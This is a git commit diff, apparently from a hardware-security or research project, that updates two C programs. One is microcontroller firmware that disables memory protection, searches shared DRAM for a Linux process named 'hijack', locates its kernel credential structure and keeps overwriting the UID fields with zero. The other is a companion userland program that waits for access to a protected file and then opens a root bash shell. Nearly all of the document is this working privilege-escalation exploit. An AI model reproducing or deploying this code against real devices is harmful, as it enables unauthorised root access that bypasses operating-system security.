073b34ddad7e9b567b20a3dcb1df021d101fd97a
Daniel Trnka <daniel.trnka@gmail.com>
2019-02-20 22:02:52 +0100

    simplied - write directly to the cred struct

--- cmake/root.c
+++ cmake/root.c
@@ -2,130 +2,153 @@
 #include "board.h"
 #include "fsl_debug_console.h"
 #include "pin_mux.h"
+
+const uint64_t kernel_start = 0x40000000;
+const uint64_t page_offset =  ((uint64_t)(0xffffffffffffffff) << (47 - 1));
+const uint64_t DDR_start = 0x40000000;
+const uint64_t DDR_end =   0xC0000000;
+
+uint32_t* virt_to_phys(uint64_t virt) {
+   return (virt & ~page_offset) + kernel_start;
+}
+
+int is_aligned(uint64_t addr) {
+   return (addr & 0x3) == 0;
+}
+
+int is_valid_addr(uint64_t phys_addr) {
+   return is_aligned(phys_addr) && phys_addr >= DDR_start && phys_addr < DDR_end; 
+}
+
+
+
+
+
 struct cred {
-    uint32_t atomic;
-    volatile uint32_t          uid;            /* real UID of the task */
-    volatile uint32_t          gid;            /* real GID of the task */
-    volatile        uint32_t          suid;           /* saved UID of the task */
-    volatile        uint32_t          sgid;           /* saved GID of the task */
-    volatile        uint32_t          euid;           /* effective UID of the task */
-    volatile        uint32_t          egid;           /* effective GID of the task */
-    volatile 			uint32_t   fsuid;
+   uint32_t atomic;
+   volatile uint32_t          uid;            /* real UID of the task */
+   volatile uint32_t          gid;            /* real GID of the task */
+   volatile        uint32_t          suid;           /* saved UID of the task */
+   volatile        uint32_t          sgid;           /* saved GID of the task */
+   volatile        uint32_t          euid;           /* effective UID of the task */
+   volatile        uint32_t          egid;           /* effective GID of the task */
+   volatile 			uint32_t   fsuid;
 
 };
 
 void DumpHex(const void* data, size_t size) {
-    char ascii[17];
-    size_t i, j;
-    ascii[16] = '\0';
-    for (i = 0; i < size; ++i) {
-	printf("%02X ", ((unsigned char*)data)[i]);
-	if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
-	    ascii[i % 16] = ((unsigned char*)data)[i];
-	} else {
-	    ascii[i % 16] = '.';
-	}
-	if ((i+1) % 8 == 0 || i+1 == size) {
-	    printf(" ");
-	    if ((i+1) % 16 == 0) {
-		printf("|  %s \r\n", ascii);
-	    } else if (i+1 == size) {
-		ascii[(i+1) % 16] = '\0';
-		if ((i+1) % 16 <= 8) {
-		    printf(" ");
-		}
-		for (j = (i+1) % 16; j < 16; ++j) {
-		    printf("   ");
-		}
-		printf("|  %s \r\n", ascii);
+   char ascii[17];
+   size_t i, j;
+   ascii[16] = '\0';
+   for (i = 0; i < size; ++i) {
+      printf("%02X ", ((unsigned char*)data)[i]);
+      if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
+	 ascii[i % 16] = ((unsigned char*)data)[i];
+      } else {
+	 ascii[i % 16] = '.';
+      }
+      if ((i+1) % 8 == 0 || i+1 == size) {
+	 printf(" ");
+	 if ((i+1) % 16 == 0) {
+	    printf("|  %s \r\n", ascii);
+	 } else if (i+1 == size) {
+	    ascii[(i+1) % 16] = '\0';
+	    if ((i+1) % 16 <= 8) {
+	       printf(" ");
 	    }
-	}
-    }
-    printf("\r\n");
+	    for (j = (i+1) % 16; j < 16; ++j) {
+	       printf("   ");
+	    }
+	    printf("|  %s \r\n", ascii);
+	 }
+      }
+   }
+   printf("\r\n");
 }
 
 uint8_t* find_process(const char* find) {
-    int len = strlen(find);
+   int len = strlen(find);
 
-    for(uint8_t *s = 0x40000000; s <  0xC0000000; s++) {
-	int found = true;
-	uint8_t *c = s;
-	for(int i = 0; i < len; i++) {
-	    if(*c != find[i]) {
-		found = false;
-		break;
-	    }
-	    c++;
-	}
+   for(uint8_t *s = 0x0000000070000000; s < 0xC0000000; s++) {
+      if((((uint32_t)s) & 0x64fffff) == 0x6400000) {
+	 printf("AT %p\r\n", s);
+      }
 
-	if(found) {
-	    printf("at: %p ", s);
-#define PAGE_OFFSET		((uint64_t)(0xffffffffffffffff) << (47 - 1))
-	    uint64_t start = 0x40000000;
-	    uint64_t addr = (*((uint64_t*)(s-16)) & ~PAGE_OFFSET) + start;
-	    printf("%p\r\n", addr);
-	    struct cred *real_cred = addr - 16; //s - 16;
+      int found = true;
+      uint8_t *c = s;
+      for(int i = 0; i < len; i++) {
+	 if(*c != find[i]) {
+	    found = false;
+	    break;
+	 }
+	 c++;
+      }
+
+      if(found && is_aligned(s)) {
+	 uint64_t cred_virt = *(uint64_t*)(s - 16) /* sizeof two 64bit pointers to cred structures */;
+	 uint64_t cred_phys = virt_to_phys(cred_virt);
+
+	 if(!is_valid_addr(cred_phys)) {
+	    printf("addr not valid %llx %llx\r\n", cred_virt, cred_phys);
+	 } else {
+	    printf("found: %llx %llx\r\n", cred_virt, cred_phys); 
+	    DumpHex(s-16, 128);
+
+	    struct cred *real_cred = cred_phys;
 	    printf("%u\r\n", real_cred->uid);
-	DumpHex(addr - 32, 128);
 
+	    if(real_cred->uid == 1000) {
+	       printf("propably found process\r\n");
 
-	}
-    }
-    printf("done\r\n");
+	       for(;;) {
+		  real_cred->uid = 0;
+		  __DSB();
+		  real_cred->suid = 0;
+		  __DSB();
+		  real_cred->fsuid = 0;
+		  __DSB();
+		  real_cred->euid = 0;
+		  __DSB();
+	       }
+
+	       return s;
+	    }
+	 }
+      }
+   }
+
+   printf("done\r\n");
+   for(;;);
+   return NULL;
 }
 
 
 
 int main(void) {
-    BOARD_RdcInit();
-    BOARD_InitPins();
-    BOARD_BootClockRUN();
-    BOARD_InitDebugConsole();
-    //    BOARD_InitMemory();
-    
-    MPU->CTRL = 0;
+   BOARD_RdcInit();
+   BOARD_InitPins();
+   BOARD_BootClockRUN();
+   BOARD_InitDebugConsole();
+   //    BOARD_InitMemory();
 
-MPU->RBAR = (0x40000000U & MPU_RBAR_ADDR_Msk) | MPU_RBAR_VALID_Msk | (2 << MPU_RBAR_REGION_Pos);
- MPU->RASR =
-        (0x3 << MPU_RASR_AP_Pos) | (0x1 << MPU_RASR_B_Pos) | (ARM_MPU_REGION_SIZE_2GB << MPU_RASR_SIZE_Pos) | MPU_RASR_ENABLE_Msk;
+   MPU->CTRL = 0;
+
+   MPU->RBAR = (0x40000000U & MPU_RBAR_ADDR_Msk) | MPU_RBAR_VALID_Msk | (2 << MPU_RBAR_REGION_Pos);
+   MPU->RASR =
+      (0x3 << MPU_RASR_AP_Pos) | (0x1 << MPU_RASR_B_Pos) | (ARM_MPU_REGION_SIZE_2GB << MPU_RASR_SIZE_Pos) | MPU_RASR_ENABLE_Msk;
 
 
 
-    MPU->CTRL = MPU_CTRL_ENABLE_Msk | MPU_CTRL_PRIVDEFENA_Msk;
-    __DSB();
-    __ISB();
-    
+   MPU->CTRL = MPU_CTRL_ENABLE_Msk | MPU_CTRL_PRIVDEFENA_Msk;
+   __DSB();
+   __ISB();
 
-    printf("=========================\r\n");
 
-#define PAGE_OFFSET		((uint64_t)(0xffffffffffffffff) << (47 - 1))
-
-    uint8_t *ss = 0x0000000076765a08;
-
-    uint64_t start = 0x40000000;
-    uint64_t addr = (*((uint64_t*)(ss-16)) & ~PAGE_OFFSET) + start;
-    printf("%llx\r\n", addr);
-
-    {
-	uint64_t addr = (*((uint64_t*)(ss-16)) & ~PAGE_OFFSET) + start;
-	volatile struct cred *cred = addr;
-	printf("cred: %d\r\n", cred->uid);
-	DumpHex(ss-16, 128);
-    }
-    __DSB();
-    *((uint64_t*) (ss - 16)) = 0xffff8000363bb9c0; 
-    __DSB();
-    *((uint64_t*) (ss - 8)) = 0xffff8000363bb9c0; 
-    __DSB();
-    {
-	uint64_t addr = (*((uint64_t*)(ss-16)) & ~PAGE_OFFSET) + start;
-	volatile struct cred *cred = addr;
-	printf("cred: %d\r\n", cred->uid);
-	DumpHex(ss-16, 128);
-    }
-    for(;;);
-
-    uint8_t *s = 0x00000000777a9500;
-
-    for(;;);
+   printf("=========================\r\n");
+   uint32_t proc_comm = find_process("hijack");
+   if(!proc_comm) {
+      printf("process not found!\r\n");
+      for(;;);
+   }
+   for(;;);
 }
--- hijack.c
+++ hijack.c
@@ -2,22 +2,17 @@
 #include <sys/types.h>
 #include <unistd.h>
 #include <stdio.h>
-
+#include <stdlib.h>
 
 int main() {
 	int d = open("/dev/test", O_RDWR);
-	if(d < 0) {
-		perror("/dev/test");
-		return 1;
-	}
 
 	for(;;) {
 		if(open("/secured", O_RDWR) >= 0) {
-			printf("access granted - opened");
+			printf("root gained\n");
 			system("bash");
 			return 1;
 		}
-		printf("%d\n", getuid());
 		perror("/secured: ");
 		usleep(100 * 1000);
 	}
